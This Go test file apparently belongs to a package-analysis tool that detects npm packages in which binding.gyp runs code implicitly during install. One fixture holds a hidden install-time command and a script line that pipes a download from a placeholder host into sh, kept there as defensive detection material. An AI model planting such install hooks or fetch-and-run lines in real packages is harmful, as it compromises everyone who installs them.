package extract

import (
	"fmt"
	"reflect"
	"slices"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func TestRunConnectsImplicitNodeGypCommandAndExactTarget(t *testing.T) {
	artifacts, contents, manifestID, bindingID, targetID := npmBindingGypRunFixture(
		t,
		`{"name":"executable-stories-demo","version":"0.1.11","scripts":{"build":"tsup"}}`,
		`{"targets":[{"target_name":"Setup","type":"none","sources":["<!(node index.js > /dev/null 2>&1 && echo stub.c)"]}]}`,
		`const cp = require("child_process"); cp.exec("curl https://gyp-target.example.invalid/p | sh");`,
	)
	graph := Run(Context{Artifacts: &artifacts, Contents: contents})

	root := executionRootByKind(graph.ExecutionRoots, npmBindingGypRootKind)
	if root == nil || root.DeclarationNodeID != bindingID || root.StartNodeID != "" || root.StartScopeID == "" ||
		root.Name != "executable-stories-demo" || root.Interpreter != "node-gyp" || !slices.Equal(root.Arguments, []string{"rebuild"}) || len(root.EvidenceIDs) != 2 {
		t.Fatalf("implicit node-gyp root lost exact semantics: %#v", root)
	}
	if !hasConnectedOperationKindForNode(graph.Operations, bindingID, root.ID, behavior.OperationInterpreterInvoke) {
		t.Fatalf("GYP command expansion did not produce a connected interpreter invocation: %#v", graph.Operations)
	}
	target := invokedTargetForNode(graph.InvokedTargets, targetID)
	if target == nil || target.Execution.Connectivity != behavior.ConnectivityConnected ||
		!slices.Contains(target.Execution.ExecutionRootIDs, root.ID) || target.Source.Kind != behavior.EntityKindExecutionRoot || target.Source.ID != root.ID {
		t.Fatalf("exact GYP command target was not connected to the root: %#v", graph.InvokedTargets)
	}
	if !hasConnectedOperationResource(graph.Operations, root.ID, "https://gyp-target.example.invalid/p") {
		t.Fatalf("selected target behavior did not inherit the implicit install root: %#v", graph.Operations)
	}
	if countCoverageStatusContaining(graph.Coverage, npmBindingGypSelectionArea, "analyzed", npmBindingGypProfile) != 1 ||
		countCoverageContaining(graph.Coverage, npmBindingGypActivationArea, "npm version and dependency-script policy") != 1 {
		t.Fatalf("selection and activation boundaries are not explicit: %#v", graph.Coverage)
	}
	evidenceByID := make(map[string]behavior.Evidence, len(graph.Evidence))
	for _, evidence := range graph.Evidence {
		evidenceByID[evidence.ID] = evidence
	}
	foundManifest, foundExpansion := false, false
	for _, evidenceID := range root.EvidenceIDs {
		evidence := evidenceByID[evidenceID]
		foundManifest = foundManifest || evidence.NodeID == manifestID && evidence.Kind == "npm-implicit-node-gyp-selection"
		foundExpansion = foundExpansion || evidence.NodeID == bindingID && evidence.Kind == "gyp-command-expansion" && strings.Contains(evidence.Value, "node index.js")
	}
	if !foundManifest || !foundExpansion {
		t.Fatalf("root evidence was not located on the exact declarations: root=%#v evidence=%#v", root, graph.Evidence)
	}
}

func TestImplicitNodeGypManifestConditionsFailClosed(t *testing.T) {
	tests := []struct {
		name      string
		manifest  string
		logical   string
		binding   string
		wantPlan  bool
		wantIssue string
	}{
		{name: "ordinary implicit default", manifest: `{"name":"fixture"}`, logical: "fixture.tgz!package/package.json", binding: npmBindingGypFixtureDocument(), wantPlan: true},
		{name: "gypfile true", manifest: `{"name":"fixture","gypfile":true}`, logical: "fixture.tgz!package/package.json", binding: npmBindingGypFixtureDocument(), wantPlan: true},
		{name: "postinstall does not replace implicit install", manifest: `{"name":"fixture","scripts":{"postinstall":"echo kept"}}`, logical: "fixture.tgz!package/package.json", binding: npmBindingGypFixtureDocument(), wantPlan: true},
		{name: "preinstall declaration overrides default", manifest: `{"name":"fixture","scripts":{"preinstall":""}}`, logical: "fixture.tgz!package/package.json", binding: npmBindingGypFixtureDocument()},
		{name: "install declaration overrides default", manifest: `{"name":"fixture","scripts":{"install":"echo own"}}`, logical: "fixture.tgz!package/package.json", binding: npmBindingGypFixtureDocument()},
		{name: "gypfile false disables default", manifest: `{"name":"fixture","gypfile":false}`, logical: "fixture.tgz!package/package.json", binding: npmBindingGypFixtureDocument()},
		{name: "nonboolean gypfile fails closed", manifest: `{"name":"fixture","gypfile":"false"}`, logical: "fixture.tgz!package/package.json", binding: npmBindingGypFixtureDocument(), wantIssue: "gypfile is not a boolean"},
		{name: "dependency tree is not an inspected package root", manifest: `{"name":"fixture"}`, logical: "fixture/node_modules/fixture/package.json", binding: npmBindingGypFixtureDocument()},
		{name: "wrong-case sibling is not exact", manifest: `{"name":"fixture"}`, logical: "fixture.tgz!package/package.json", binding: ""},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			contents := npmBindingGypPlanContents(test.logical, test.manifest, test.binding)
			if test.name == "wrong-case sibling is not exact" {
				contents = append(contents, artifact.Content{NodeID: "node-binding", LogicalPath: "fixture.tgz!package/Binding.gyp", Kind: "text", Role: "runtime", Data: []byte(npmBindingGypFixtureDocument())})
			}
			plans := planNPMBindingGypInstall(contents)
			if got := len(plans.plans) == 1; got != test.wantPlan {
				t.Fatalf("plan present = %v, want %v: %#v", got, test.wantPlan, plans)
			}
			if test.wantIssue != "" && (len(plans.issues) != 1 || !strings.Contains(plans.issues[0].detail, test.wantIssue)) {
				t.Fatalf("plan issues = %#v, want one containing %q", plans.issues, test.wantIssue)
			}
		})
	}
}

func TestImplicitNodeGypRejectsUnsupportedAndMalformedDocuments(t *testing.T) {
	tests := []struct {
		name, binding, detail string
	}{
		{name: "malformed", binding: `{"targets":[`, detail: "outside the bounded JSON-compatible"},
		{name: "Python literal", binding: `{'targets': []}`, detail: "outside the bounded JSON-compatible"},
		{name: "variables", binding: `{"variables":{},"targets":[]}`, detail: `top-level field "variables"`},
		{name: "target conditions", binding: `{"targets":[{"target_name":"x","sources":["<!(node index.js)"],"conditions":[]}]}`, detail: `field "conditions"`},
		{name: "nonliteral sources", binding: `{"targets":[{"sources":{}}]}`, detail: "sources is not a literal array"},
		{name: "list expansion", binding: `{"targets":[{"sources":["<!@(node index.js)"]}]}`, detail: "unsupported or ambiguous"},
		{name: "embedded grouping", binding: `{"targets":[{"sources":["<!(node -e 'f()')"]}]}`, detail: "unsupported or ambiguous"},
		{name: "command suffix", binding: `{"targets":[{"sources":["prefix <!(node index.js)"]}]}`, detail: "unsupported or ambiguous"},
		{name: "nonstring source", binding: `{"targets":[{"sources":[7]}]}`, detail: "not a bounded literal string"},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			plans := planNPMBindingGypInstall(npmBindingGypPlanContents("fixture.tgz!package/package.json", `{"name":"fixture"}`, test.binding))
			if len(plans.plans) != 0 || len(plans.issues) != 1 || !strings.Contains(plans.issues[0].detail, test.detail) {
				t.Fatalf("unsupported document plan = %#v, want one issue containing %q", plans, test.detail)
			}
			var graph behavior.Graph
			resolveNPMBindingGypInstall(&graph, plans)
			if len(graph.ExecutionRoots) != 0 || len(graph.Operations) != 0 || countCoverageContaining(graph.Coverage, npmBindingGypSelectionArea, test.detail) != 1 {
				t.Fatalf("unsupported document gained behavior or lost coverage: roots=%#v operations=%#v coverage=%#v", graph.ExecutionRoots, graph.Operations, graph.Coverage)
			}
		})
	}
}

func TestImplicitNodeGypBoundsHostileCardinality(t *testing.T) {
	t.Run("targets", func(t *testing.T) {
		values := make([]string, maxNPMBindingGypTargets+1)
		for index := range values {
			values[index] = `{"sources":[]}`
		}
		assertNPMBindingGypLimit(t, `{"targets":[`+strings.Join(values, ",")+`]}`, fmt.Sprintf("target limit %d", maxNPMBindingGypTargets))
	})
	t.Run("sources", func(t *testing.T) {
		values := make([]string, maxNPMBindingGypSources+1)
		for index := range values {
			values[index] = `"stub.c"`
		}
		assertNPMBindingGypLimit(t, `{"targets":[{"sources":[`+strings.Join(values, ",")+`]}]}`, fmt.Sprintf("source limit %d", maxNPMBindingGypSources))
	})
	t.Run("commands", func(t *testing.T) {
		values := make([]string, maxNPMBindingGypCommands+1)
		for index := range values {
			values[index] = fmt.Sprintf(`"<!(node script-%03d.js)"`, index)
		}
		assertNPMBindingGypLimit(t, `{"targets":[{"sources":[`+strings.Join(values, ",")+`]}]}`, "command count/byte limit")
	})
	t.Run("package roots", func(t *testing.T) {
		var contents []artifact.Content
		for index := 0; index <= maxNPMBindingGypPackages; index++ {
			prefix := fmt.Sprintf("fixture.tgz!package-%02d", index)
			contents = append(contents, npmBindingGypPlanContents(prefix+"/package.json", fmt.Sprintf(`{"name":"fixture-%02d"}`, index), npmBindingGypFixtureDocument())...)
		}
		plans := planNPMBindingGypInstall(contents)
		if plans.plans != nil || len(plans.issues) == 0 || !strings.Contains(plans.issues[len(plans.issues)-1].detail, fmt.Sprintf("candidate limit %d", maxNPMBindingGypPackages)) {
			t.Fatalf("package-root candidate limit did not fail closed: %#v", plans)
		}
	})
}

func TestImplicitNodeGypPlanningIsDeterministic(t *testing.T) {
	contents := append(
		npmBindingGypPlanContents("fixture.tgz!one/package.json", `{"name":"one"}`, npmBindingGypFixtureDocument()),
		npmBindingGypPlanContents("fixture.tgz!two/package.json", `{"name":"two"}`, `{"targets":[{"target_name":"B","sources":["<!(node b.js)"]}]}`)...,
	)
	first := planNPMBindingGypInstall(contents)
	slices.Reverse(contents)
	second := planNPMBindingGypInstall(contents)
	project := func(set npmBindingGypPlanSet) []string {
		var out []string
		for _, plan := range set.plans {
			out = append(out, plan.manifest.LogicalPath, plan.binding.LogicalPath, plan.packageName)
			for _, expansion := range plan.expansions {
				out = append(out, expansion.targetName, fmt.Sprint(expansion.sourceIndex), expansion.command)
			}
		}
		for _, issue := range set.issues {
			out = append(out, issue.nodeID, issue.detail)
		}
		return out
	}
	if !reflect.DeepEqual(project(first), project(second)) {
		t.Fatalf("binding.gyp planning depends on content order: first=%#v second=%#v", project(first), project(second))
	}
}

func assertNPMBindingGypLimit(t *testing.T, binding, detail string) {
	t.Helper()
	plans := planNPMBindingGypInstall(npmBindingGypPlanContents("fixture.tgz!package/package.json", `{"name":"fixture"}`, binding))
	if len(plans.plans) != 0 || len(plans.issues) != 1 || !strings.Contains(plans.issues[0].detail, detail) {
		t.Fatalf("limit plan = %#v, want one issue containing %q", plans, detail)
	}
}

func npmBindingGypFixtureDocument() string {
	return `{"targets":[{"target_name":"Setup","type":"none","sources":["<!(node index.js > /dev/null 2>&1 && echo stub.c)"]}]}`
}

func npmBindingGypPlanContents(manifestLogical, manifest, binding string) []artifact.Content {
	contents := []artifact.Content{{
		NodeID:      "node-manifest-" + manifestLogical,
		ScopeID:     "scope-manifest-" + manifestLogical,
		LogicalPath: manifestLogical,
		Kind:        "manifest",
		Role:        "runtime",
		Data:        []byte(manifest),
	}}
	if binding == "" {
		return contents
	}
	bindingLogical, _ := resolveSiblingLogical(manifestLogical, "binding.gyp")
	return append(contents, artifact.Content{
		NodeID:      "node-binding-" + manifestLogical,
		ScopeID:     "scope-binding-" + manifestLogical,
		LogicalPath: bindingLogical,
		Kind:        "text",
		Role:        "runtime",
		Data:        []byte(binding),
	})
}

func npmBindingGypRunFixture(t *testing.T, manifest, binding, target string) (artifact.Graph, []artifact.Content, string, string, string) {
	t.Helper()
	var artifacts artifact.Graph
	count := 3
	rootID := artifacts.AddNode(artifact.Node{LogicalPath: "fixture.tgz", Kind: "gzip", MediaType: "application/gzip", AnalyzeStatus: "analyzed", DeclaredEntryCount: &count, ModeledEntryCount: &count})
	manifestID := artifacts.AddNode(artifact.Node{ParentID: rootID, LogicalPath: "fixture.tgz!package/package.json", Kind: "manifest", MediaType: "text/plain", SourceRole: "runtime", AnalyzeStatus: "analyzed"})
	bindingID := artifacts.AddNode(artifact.Node{ParentID: rootID, LogicalPath: "fixture.tgz!package/binding.gyp", Kind: "text", MediaType: "text/plain", SourceRole: "runtime", AnalyzeStatus: "analyzed"})
	targetID := artifacts.AddNode(artifact.Node{ParentID: rootID, LogicalPath: "fixture.tgz!package/index.js", Kind: "script", MediaType: "text/plain", SourceRole: "runtime", AnalyzeStatus: "analyzed"})
	contents := []artifact.Content{
		{NodeID: manifestID, LogicalPath: "fixture.tgz!package/package.json", Kind: "manifest", MediaType: "text/plain", Role: "runtime", Data: []byte(manifest)},
		{NodeID: bindingID, LogicalPath: "fixture.tgz!package/binding.gyp", Kind: "text", MediaType: "text/plain", Role: "runtime", Data: []byte(binding)},
		{NodeID: targetID, LogicalPath: "fixture.tgz!package/index.js", Kind: "script", MediaType: "text/plain", Role: "runtime", Data: []byte(target)},
	}
	return artifacts, contents, manifestID, bindingID, targetID
}

func executionRootByKind(roots []behavior.ExecutionRoot, kind string) *behavior.ExecutionRoot {
	for index := range roots {
		if roots[index].Kind == kind {
			return &roots[index]
		}
	}
	return nil
}

func hasConnectedOperationKindForNode(operations []behavior.ModeledOperation, nodeID, rootID string, kind behavior.OperationKind) bool {
	for _, operation := range operations {
		if operation.SubjectNodeID == nodeID && operation.Kind == kind && operation.Execution.Connectivity == behavior.ConnectivityConnected && slices.Contains(operation.Execution.ExecutionRootIDs, rootID) {
			return true
		}
	}
	return false
}
